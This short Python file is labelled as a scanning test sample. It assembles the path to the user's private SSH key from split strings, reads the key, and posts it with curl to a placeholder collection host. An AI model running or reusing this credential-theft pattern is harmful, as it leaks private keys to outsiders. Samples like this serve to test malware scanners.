# DO NOT RUN — scanning test sample

import os
import subprocess


def main() -> None:
    home = os.environ["HOME"]
    a, b = ".s", "sh"
    c, d = "id_", "rsa"
    target = "/".join([home, a + b, c + d])
    out = subprocess.run(["/bin/cat", target], capture_output=True).stdout
    url = "https:" + "//collect.example.invalid/c"
    subprocess.run(["curl", "-s", "-d", "@-", url], input=out)


if __name__ == "__main__":
    main()
